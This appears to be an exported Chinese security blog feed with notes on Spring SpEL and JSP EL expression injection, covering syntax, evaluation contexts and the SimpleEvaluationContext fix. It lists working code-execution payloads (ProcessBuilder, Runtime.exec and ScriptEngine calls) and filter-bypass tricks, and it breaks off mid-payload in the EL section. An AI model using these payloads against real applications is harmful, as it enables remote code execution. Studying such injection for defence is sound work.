title="XML配置"></a>XML配置</h3><p>配置Bean:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;bean id=<span class="string">&quot;xxx&quot;</span> class=<span class="string">&quot;com.java.XXXXX.xx&quot;</span>&gt;</span><br><span class="line">&lt;!-- 同<span class="meta">@Value</span>,#&#123;&#125;内是表达式的值，可放在property或constructor-arg内 --&gt;</span><br><span class="line">&lt;property name=<span class="string">&quot;arg&quot;</span> value=<span class="string">&quot;#&#123;表达式&#125;&quot;</span>&gt;</span><br><span class="line">&lt;/bean&gt;</span><br></pre></td></tr></table></figure><blockquote><p>**<code>id=&quot;xxx&quot;</code>**：Bean 的唯一标识符</p><p>**<code>class=&quot;com.java.XXXXX.xx&quot;</code>**：Bean 的完整类名</p><p>**<code>&lt;property&gt;</code>**：设置 Bean 的属性值</p><p>**<code>name=&quot;arg&quot;</code>**：要设置的属性名称</p><p>**<code>value=&quot;#&#123;表达式&#125;&quot;</code>**：使用 SpEL 表达式计算属性值</p></blockquote><p>其实与@Value功能是等价的，只是配置形式不同</p><p>demo：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">XML配置方式：</span><br><span class="line">&lt;bean id=<span class="string">&quot;service&quot;</span> class=<span class="string">&quot;com.java.UserService&quot;</span>&gt;</span><br><span class="line">    &lt;property name=<span class="string">&quot;username&quot;</span> value=<span class="string">&quot;#&#123;user.name&#125;&quot;</span>/&gt;</span><br><span class="line">&lt;/bean&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Value</span>注解配置：</span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserService</span> &#123;</span><br><span class="line">    <span class="meta">@Value(&quot;#&#123;user.name&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><code>@Component</code> 是 <strong>Spring 框架中最基本的注解之一</strong>，用于标识一个类作为 <strong>Spring 容器管理的 Bean</strong>。</p></blockquote><h3 id="Expression"><a href="#Expression" class="headerlink" title="Expression"></a>Expression</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SpelExpressionParser parser=<span class="keyword">new</span> <span class="title class_">SpelExpressionParser</span>();</span><br><span class="line">Expression expression=parser.parseExpression(input);</span><br><span class="line"><span class="keyword">return</span> expression.getValue().toString();</span><br></pre></td></tr></table></figure><p>Spel使用ExpressionParser接口表示解析器。然后使用提供的parseExpression方法来解析相应的表达式为Expression对象，最后通过Expression#getValue方法根据上下文获取表达式的值</p><p>SpEL不仅支持属性访问和方法调用，还支持集合操作、正则匹配、表达式求值、对象创建等，是Spring应用中的通用表达式解析工具。</p><h2 id="SpEL语法及支持的功能特性"><a href="#SpEL语法及支持的功能特性" class="headerlink" title="SpEL语法及支持的功能特性"></a>SpEL语法及支持的功能特性</h2><p>Spel表达式以<code>#&#123;</code>开头，以<code>&#125;</code>结尾：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#123;表达式&#125;</span><br></pre></td></tr></table></figure><p>以<code>$&#123;</code>开头，以<code>&#125;</code>结尾表示属性名称引用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123; spring.user.name &#125;</span><br></pre></td></tr></table></figure><p><code>T(Type)</code>运算符会调用类的作用域和方法，它返回的是一个对象，它可以帮助获取某个类的静态方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#123;T(全限定类名).方法名()&#125;</span><br></pre></td></tr></table></figure><p>还支持通过new来实例化对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#123;<span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;open&quot;</span>, <span class="string">&quot;-a&quot;</span>, <span class="string">&quot;Calculator&quot;</span>&#125;).start()&#125;</span><br></pre></td></tr></table></figure><p>SpEL 主要支持以下操作：</p><table><thead><tr><th>功能</th><th>示例</th><th>描述</th></tr></thead><tbody><tr><td>文字表达式</td><td><code>&#39;hello&#39;</code>, <code>123</code>, <code>true</code></td><td>字符串、数字、布尔值、null</td></tr><tr><td>属性访问</td><td><code>person.name</code></td><td>访问对象属性</td></tr><tr><td>方法调用</td><td><code>&#39;abc&#39;.toUpperCase()</code></td><td>调用实例方法</td></tr><tr><td>静态方法</td><td><code>T(java.lang.Math).random()</code></td><td>访问 Java 类的静态方法或字段</td></tr><tr><td>对象创建</td><td><code>new java.util.Date()</code></td><td>实例化对象</td></tr><tr><td>集合操作</td><td><code>list[0]</code>, <code>map[&#39;key&#39;]</code></td><td>访问数组、List、Map</td></tr><tr><td>关系运算符</td><td><code>age &gt; 18</code></td><td>比较操作，如 &gt;、&lt;、&#x3D;&#x3D; 等</td></tr><tr><td>逻辑运算符</td><td><code>true and false</code></td><td><code>and</code>、<code>or</code>、<code>not</code> 逻辑组合</td></tr><tr><td>条件（三元）运算符</td><td><code>score &gt; 60 ? &#39;及格&#39; : &#39;不及格&#39;</code></td><td>简化条件判断</td></tr><tr><td>正则表达式</td><td><code>&#39;abc&#39; matches &#39;[a-z]+&#39;</code></td><td>字符串正则匹配</td></tr><tr><td>Bean 引用</td><td><code>@myBean</code></td><td>引用 Spring 容器中的 Bean</td></tr><tr><td>投影操作</td><td><code>list.![name]</code></td><td>从集合中提取每个元素的某个属性</td></tr><tr><td>过滤操作</td><td><code>list.?[age &gt; 18]</code></td><td>过滤集合中满足条件的元素</td></tr><tr><td>变量引用</td><td><code>#name</code>, <code>#user.age</code></td><td>使用上下文中定义的变量</td></tr><tr><td>模板表达式</td><td><code>&quot;Welcome, #&#123;#user.name&#125;!&quot;</code></td><td>与字符串模板结合生成动态字符串</td></tr></tbody></table><h2 id="SpEL执行机制"><a href="#SpEL执行机制" class="headerlink" title="SpEL执行机制"></a>SpEL执行机制</h2><ul><li><strong>ExpressionParser</strong></li><li><strong>EvaluationContext</strong></li></ul><h3 id="ExpressionParser-表达式解析器"><a href="#ExpressionParser-表达式解析器" class="headerlink" title="ExpressionParser(表达式解析器)"></a>ExpressionParser(表达式解析器)</h3><p>用于将字符串形式的表达式解析为<code>Expression</code>对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ExpressionParser parser=<span class="keyword">new</span> <span class="title class_">ExpressionParser</span>();</span><br><span class="line">Expression expression=parser.parseExpression(input);</span><br></pre></td></tr></table></figure><h3 id="EvaluationContext-表达式上下文"><a href="#EvaluationContext-表达式上下文" class="headerlink" title="EvaluationContext(表达式上下文)"></a>EvaluationContext(表达式上下文)</h3><p>在执行表达式时提供变量、对象、函数等运行环境，简单来说就是<strong>表达式执行的运行环境</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">StandardEvaluationContext context=<span class="keyword">new</span> <span class="title class_">StandardEvaluationContext</span>(user);</span><br><span class="line"><span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> expr.getValue(context, Integer.class);</span><br></pre></td></tr></table></figure><p>主要有<code>StandardEvaluationContext</code> 和 <code>SimpleEvaluationContext</code>两种</p><p>有些老版本不支持<code>SimpleEvaluationContext</code>，并且如果不做特意说明的情况下，默认是使用更不安全的<code>StandardEvaluationContext</code></p><p>其中<code>StandardEvaluationContext</code>功能最强大，支持SpEL的所有特性，而<code>SimpleEvaluationContext</code>功能受限，专为安全场景设计</p><table><thead><tr><th>功能类别</th><th>StandardEvaluationContext ✅</th><th>SimpleEvaluationContext 🛡️</th><th>说明</th></tr></thead><tbody><tr><td>设置根对象</td><td>✅ 支持</td><td>✅ 支持</td><td>设置表达式的默认作用对象</td></tr><tr><td>设置变量</td><td>✅ 支持</td><td>✅ 支持</td><td>可使用 <code>#varName</code> 形式</td></tr><tr><td>注册自定义函数</td><td>✅ 支持</td><td>❌ 不支持</td><td>可用静态方法注册为函数</td></tr><tr><td>访问 Java 类</td><td>✅ 支持（T(…)）</td><td>❌ 不支持</td><td>如 <code>T(java.lang.Math).PI</code></td></tr><tr><td>调用构造函数</td><td>✅ 支持（new）</td><td>❌ 不支持</td><td>如 <code>new java.util.Date()</code></td></tr><tr><td>访问 Spring Bean</td><td>✅ 支持（配合 BeanResolver）</td><td>❌ 不支持</td><td>通过 <code>@beanName</code> 引用</td></tr><tr><td>方法调用</td><td>✅ 支持</td><td>⚠️ 仅支持 getter</td><td>完整方法调用或属性访问</td></tr><tr><td>修改属性</td><td>✅ 支持</td><td>❌ 不支持</td><td>只读上下文不允许修改</td></tr><tr><td>集合筛选与投影</td><td>✅ 支持</td><td>❌ 不支持</td><td>如 <code>list.?[age&gt;18]</code></td></tr><tr><td>自定义类型转换器</td><td>✅ 支持</td><td>❌ 不支持</td><td>用于自定义表达式值转换</td></tr><tr><td>安全性</td><td>❌ 不安全</td><td>✅ 高安全性</td><td>用户输入不应使用标准上下文</td></tr><tr><td>适用场景</td><td>内部逻辑、系统配置</td><td>用户输入、REST绑定等</td><td>用于信任 vs 不信任来源</td></tr></tbody></table><h2 id="SpEL表达式注入"><a href="#SpEL表达式注入" class="headerlink" title="SpEL表达式注入"></a>SpEL表达式注入</h2><h3 id="前置条件"><a href="#前置条件" class="headerlink" title="前置条件"></a>前置条件</h3><ul><li><strong>传入的表达式未过滤</strong></li><li><strong>表达式解析后调用了getValue()或setValue()</strong></li><li><strong>使用StandardEvaluationContext作为上下文对象（如果不指定，Spring默认使用StandardEvaluationContext）</strong></li></ul><h3 id="常用POC"><a href="#常用POC" class="headerlink" title="常用POC"></a>常用POC</h3><h4 id="ProcessBuilder"><a href="#ProcessBuilder" class="headerlink" title="ProcessBuilder"></a><strong>ProcessBuilder</strong></h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#&#123;<span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;open&quot;</span>, <span class="string">&quot;-a&quot;</span>, <span class="string">&quot;Calculator&quot;</span>&#125;).start()&#125;</span><br><span class="line"></span><br><span class="line">#&#123;<span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).start()&#125;</span><br></pre></td></tr></table></figure><h4 id="Runtime"><a href="#Runtime" class="headerlink" title="Runtime"></a><strong>Runtime</strong></h4><p>Runtime的构造方法为private，不允许在外部通过new来获取对象，可以通过静态方法getRuntime来获取</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#&#123;T(java.lang.Runtime).getRuntime().exec(<span class="string">&quot;open -a Calculator&quot;</span>)&#125;</span><br><span class="line"></span><br><span class="line">#&#123;T(java.lang.Runtime).getRuntime().exec(<span class="string">&quot;calc&quot;</span>)&#125;</span><br></pre></td></tr></table></figure><h4 id="ScriptEngine"><a href="#ScriptEngine" class="headerlink" title="ScriptEngine"></a><strong>ScriptEngine</strong></h4><p>JDK6开始就自带ScriptEngineManager，支持在JS中调用Java对象，可以利用Java调用Js引擎的eval</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// nashorn 可以换成其他的引擎名称</span></span><br><span class="line">#&#123;<span class="keyword">new</span> <span class="title class_">javax</span>.script.ScriptEngineManager().getEngineByName(<span class="string">&quot;nashorn&quot;</span>).eval(<span class="string">&quot;s=[3];s[0]=&#x27;open&#x27;;s[1]=&#x27;-a&#x27;;s[2]=&#x27;Calculator&#x27;;java.lang.Runtime.getRuntime().exec(s);&quot;</span>)&#125;</span><br></pre></td></tr></table></figure><blockquote><p>s&#x3D;[3]创建一个长度为3的数组</p></blockquote><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><h4 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">T(String).getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getRuntime().exec(<span class="string">&quot;open -a Calculator&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="this"><a href="#this" class="headerlink" title="this"></a>this</h4><p>需要上下文环境</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#<span class="built_in">this</span>.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getRuntime().exec(<span class="string">&quot;calc&quot;</span>)</span><br></pre></td></tr></table></figure><blockquote><p><strong><code>#this</code> 是一个特殊的变量引用</strong>，代表 <strong>当前正在评估的上下文对象</strong>。</p></blockquote><h4 id="绕过T-过滤"><a href="#绕过T-过滤" class="headerlink" title="绕过T(过滤"></a>绕过T(过滤</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">T%00(Class)</span><br></pre></td></tr></table></figure><p>这涉及到SpEL对字符的编码，%00会被直接替换为空</p><h4 id="绕过getClass-过滤"><a href="#绕过getClass-过滤" class="headerlink" title="绕过getClass(过滤"></a>绕过getClass(过滤</h4><p>可用getSuperclass函数代替</p><h4 id="URL编码过滤绕过"><a href="#URL编码过滤绕过" class="headerlink" title="URL编码过滤绕过"></a>URL编码过滤绕过</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 当执行的系统命令被过滤或者被URL编码掉时，可以通过String类动态生成字符</span></span><br><span class="line"><span class="comment">// byte数组内容的生成后面有脚本</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String(<span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;<span class="number">99</span>,<span class="number">97</span>,<span class="number">108</span>,<span class="number">99</span>&#125;)).start()</span><br><span class="line"><span class="comment">// char转字符串，再字符串concat</span></span><br><span class="line">T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(<span class="number">99</span>).concat(T(</span><br><span class="line">java.lang.Character).toString(<span class="number">97</span>)).concat(T(java.lang.Character).toString(<span class="number">108</span>)).conc</span><br><span class="line"><span class="title function_">at</span><span class="params">(T(java.lang.Character)</span>.toString(<span class="number">99</span>)))</span><br></pre></td></tr></table></figure><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>使用<code>SimpleEvaluationContext</code>代替<code>StandardEvaluationContext</code>即可</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cainiaojc.com/spring/spring-expression-language-tutorial.html">https://www.cainiaojc.com/spring/spring-expression-language-tutorial.html</a></p><p><a href="https://www.cnblogs.com/k1115h0t/p/18919765#%E4%B8%89spel%E6%94%AF%E6%8C%81%E7%9A%84%E5%8A%9F%E8%83%BD%E7%89%B9%E6%80%A7">https://www.cnblogs.com/k1115h0t/p/18919765#三spel支持的功能特性</a></p><p><a href="https://nivi4.notion.site/SPEL-c64095c1c4214cb4b23bf4f009cb35f0">https://nivi4.notion.site/SPEL-c64095c1c4214cb4b23bf4f009cb35f0</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> java安全 </category>
          
          <category> 表达式注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SpEL表达式注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>EL表达式注入</title>
      <link href="/archives/bc5d7b36/"/>
      <url>/archives/bc5d7b36/</url>
      
        <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>Expression Language，EL表达式是JSP的内置表达式语言。是为了使JSP写起来更简单。表达式语言的灵感来自于ECMAScript和XPath表达式语言，它提供了在JSP中简化表达式的方法，让JSP的代码更加简化。</p><p>EL表达式的主要功能：</p><ul><li>获取数据：EL表达式主要用于替换JSP页面中的脚本表达式，以从各种类型的Web域中检索Java对象、获取数据</li><li>执行运算：利用EL表达式可以在JSP页面中执行一些基本的关系、逻辑、算术运算</li><li>获取Web开发常用对象：EL表达式定义了一些隐式对象，利用这些隐式对象，Web开发人员可以很轻松获得对Web常用对象的引用，从而获得这些对象中的数据</li><li>调用Java方法：EL表达式允许用户开发自定义EL函数，以在JSP页面中通过EL表达式调用Java类的方法</li></ul><h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><p>格式：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;expr&#125;</span><br></pre></td></tr></table></figure><p>expr指的是表达式，当表达式的变量不给定范围时，则默认在page范围查找，然后依次在request、session、application范围查找。也可以用范围作为前缀表示属于哪个范围的变量。如<code>$&#123;pageScope.userinfo&#125;</code>表示访问page范围中的userinfo变量。</p><p>EL表达式的属性范围：</p><ul><li>Page：PageScope</li><li>Request：RequestScope</li><li>Session：SessionScope</li><li>Application：ApplicationScope</li></ul><h2 id="基础操作符"><a href="#基础操作符" class="headerlink" title="基础操作符"></a>基础操作符</h2><p>EL表达式支持大部分Java所提供的算术和逻辑操作符：</p><table><thead><tr><th align="left"><strong>操作符</strong></th><th align="left"><strong>描述</strong></th></tr></thead><tbody><tr><td align="left"><strong>.</strong></td><td align="left"><strong>访问一个Bean属性或者一个映射条目</strong></td></tr><tr><td align="left"><strong>[]</strong></td><td align="left"><strong>访问一个数组或者链表的元素</strong></td></tr><tr><td align="left">( )</td><td align="left">组织一个子表达式以改变优先级</td></tr><tr><td align="left">+</td><td align="left">加</td></tr><tr><td align="left">-</td><td align="left">减或负</td></tr><tr><td align="left">*</td><td align="left">乘</td></tr><tr><td align="left">&#x2F; or div</td><td align="left">除</td></tr><tr><td align="left">% or mod</td><td align="left">取模</td></tr><tr><td align="left">&#x3D;&#x3D; or eq</td><td align="left">测试是否相等</td></tr><tr><td align="left">!&#x3D; or ne</td><td align="left">测试是否不等</td></tr><tr><td align="left">&lt; or lt</td><td align="left">测试是否小于</td></tr><tr><td align="left">&gt; or gt</td><td align="left">测试是否大于</td></tr><tr><td align="left">&lt;&#x3D; or le</td><td align="left">测试是否小于等于</td></tr><tr><td align="left">&gt;&#x3D; or ge</td><td align="left">测试是否大于等于</td></tr><tr><td align="left">&amp;&amp; or and</td><td align="left">测试逻辑与</td></tr><tr><td align="left">|| or or</td><td align="left">测试逻辑或</td></tr><tr><td align="left">! or not</td><td align="left">测试取反</td></tr><tr><td align="left">empty</td><td align="left">测试是否空值</td></tr></tbody></table><p>其中比较重要的是：</p><ul><li><code>.</code>：访问一个Bean属性或者一个映射条目</li><li><code>[]</code>：访问一个数组或者链表元素。当要存取的属性名称中包含一些特殊字符，就一定要用<code>[]</code>，例如：<code>$&#123;user.My-Name&#125;</code>应当改为<code>$&#123;user[&quot;My-Name&quot;]&#125;</code>。如需动态取值，同样需要用<code>[]</code></li></ul><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p>EL表达式支持使用函数。这些函数必须被定义在自定义标签库中，语法：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;ns:func(param1, param2, ...)&#125;</span><br></pre></td></tr></table></figure><blockquote><p>ns指命名空间，func指函数名称，param指参数</p></blockquote><p>用EL表达式调用函数必须使用<code>taglib</code>引入你的标签库</p><h2 id="隐式对象"><a href="#隐式对象" class="headerlink" title="隐式对象"></a>隐式对象</h2><ul><li>pageContext：JSP页上下文，可以用于访问JSP隐式对象，如请求、响应、会话、输出、servletContext等。例如，<code>$&#123;pageContext.response&#125;</code>为页面的响应对象赋值。</li><li>param：将请求参数名称映射到单个字符串参数数值，返回的是单一字符串（通过调用<code>ServletRequest.getParameter(String name)</code>获得)，表达式<code>$&#123;param.name&#125;</code>或者<code>$&#123;param[&quot;name&quot;]</code>相当于<code>request.getParameter(name)</code>。</li><li>paramValues：将请求参数名称映射到一个数值数组，返回一个字符串数组（通过调用<code>ServletRequest.getParameter(String name)</code>获得)，表达式<code>&#123;$paramvalues.name&#125;</code>相当于<code>request.geParamterValues(name)</code>。</li><li>header：将请求头名称映射到单个字符串头值（通过调用<code>ServletRequest.getHeader(String name)</code>获得），表达式<code>$&#123;header.name&#125;</code>相当于request.getHeader(name)</li><li>headerValues：将请求头名称映射到一个数值数组（通过调用<code>ServletRequest.getHeaders(String)</code>获得），表达式<code>$&#123;headerValues.name&#125;</code>相当于request.getHeaderValues(name)</li><li>cookie：将cookie名称映射到单个cookie对象。向服务器发出的客户端请求可以获得一个或多个cookie。表达式<code>$&#123;cookie.name.value&#125;</code>返回带有特定名称的第一个coookie值。如果请求包含多个同名的cookie，则应该使用<code>$&#123;headerValues.name&#125;</code>表达式。</li><li>initParam：将上下文初始化参数名称映射到单个值（通过调用<code>ServletContext.getInitparameter(String name)</code>获得）。</li></ul><h3 id="pageContext对象"><a href="#pageContext对象" class="headerlink" title="pageContext对象"></a>pageContext对象</h3><p>pageContext对象是JSP中pageContext对象的引用。通过pageContext对象，您可以访问request对象，比如访问request对象传入的查询字符串：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;pageContext.request.queryString&#125;</span><br></pre></td></tr></table></figure><p><img src="/archives/bc5d7b36/image-20251012183512461.png" alt="image-20251012183512461"></p><h3 id="Scope对象"><a href="#Scope对象" class="headerlink" title="Scope对象"></a>Scope对象</h3><p>pageScope，requestScope，sessionScope，applicationScope变量用来访问存储在各个作用域层次的变量。</p><p>举例来说，如果您需要显式访问在applicationScope层的box变量，可以这样来访问：applicationScope.box。</p><h3 id="param和paramValues对象"><a href="#param和paramValues对象" class="headerlink" title="param和paramValues对象"></a>param和paramValues对象</h3><p>param和paramValues对象用来访问参数值，通过使用request.getParameter方法和request.getParameterValues方法。</p><p>举例来说，访问一个名为order的参数，可以这样使用表达式：${param.order}，或者${param[“order”]}。</p><p>demo：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.*,java.util.*&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">String</span> <span class="variable">title</span> <span class="operator">=</span> <span class="string">&quot;Accessing Request Param&quot;</span>;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;&lt;% out.print(title); %&gt;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;h1&gt;&lt;% out.print(title); %&gt;&lt;/h1&gt;</span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;div align=<span class="string">&quot;center&quot;</span>&gt;</span><br><span class="line">&lt;p&gt;$&#123;param[<span class="string">&quot;username&quot;</span>]&#125;&lt;/p&gt;</span><br><span class="line">&lt;p&gt;$&#123;paramValues[<span class="string">&quot;username&quot;</span>]&#125;&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><img src="/archives/bc5d7b36/image-20251012184020402.png" alt="image-20251012184020402"></p><p>param对象返回单一的字符串，而paramValues对象则返回一个字符串数组。</p><h3 id="header和headerValues对象"><a href="#header和headerValues对象" class="headerlink" title="header和headerValues对象"></a>header和headerValues对象</h3><p>header和headerValues对象用来访问信息头，通过使用 request.getHeader方法和request.getHeaders方法。</p><p>举例来说，要访问一个名为user-agent的信息头，可以这样使用表达式：${header.user-agent}，或者${header[“user-agent”]}。</p><p>demo:</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.*,java.util.*&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">String</span> <span class="variable">title</span> <span class="operator">=</span> <span class="string">&quot;User Agent Example&quot;</span>;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;&lt;% out.print(title); %&gt;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;h1&gt;&lt;% out.print(title); %&gt;&lt;/h1&gt;</span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;div align=<span class="string">&quot;center&quot;</span>&gt;</span><br><span class="line">&lt;p&gt;$&#123;header[<span class="string">&quot;user-agent&quot;</span>]&#125;&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><img src="/archives/bc5d7b36/image-20251012184157816.png" alt="image-20251012184157816"></p><p>header对象返回单一值，而headerValues则返回一个字符串数组。</p><h2 id="JSP中启动-禁用EL表达式"><a href="#JSP中启动-禁用EL表达式" class="headerlink" title="JSP中启动&#x2F;禁用EL表达式"></a>JSP中启动&#x2F;禁用EL表达式</h2><p>其中，JSP2.0中默认启用EL表达式</p><p>全局禁用EL表达式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp-config&gt;</span><br><span class="line">    &lt;jsp-property-group&gt;</span><br><span class="line">        &lt;url-pattern&gt;*.jsp&lt;/url-pattern&gt;</span><br><span class="line">        &lt;el-ignored&gt;<span class="literal">true</span>&lt;/el-ignored&gt;</span><br><span class="line">    &lt;/jsp-property-group&gt;</span><br><span class="line">&lt;/jsp-config&gt;</span><br></pre></td></tr></table></figure><p>单个文件禁用EL表达式：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page isELIgnored=<span class="string">&quot;true&quot;</span> %&gt;</span><br></pre></td></tr></table></figure><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>这里我们分析下EL表达式是如何解析的呢？</p><p>index.jsp：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;applicationScope&#125;</span><br></pre></td></tr></table></figure><p>运行后在<code>D:\java8\apache-tomcat-9.0.109\work\Catalina\localhost\ROOT\org\apache\jsp</code>找到生成的java文件：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(java.lang.String) org.apache.jasper.runtime.PageContextImpl.proprietaryEvaluate(<span class="string">&quot;$&#123;applicationScope&#125;&quot;</span>, java.lang.String.class, (javax.servlet.jsp.PageContext)_jspx_page_context, <span class="literal">null</span>)</span><br></pre></td></tr></table></figure><p>在Java中则通过org.apache.jasper.runtime.PageContextImpl#proprietaryEvaluate方法来处理EL表达式</p><p>exp：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;<span class="string">&#x27;&#x27;</span>.getClass().forName(<span class="string">&quot;javax.script.ScriptEngineManager&quot;</span>).newInstance().getEngineByName(<span class="string">&quot;js&quot;</span>).eval(<span 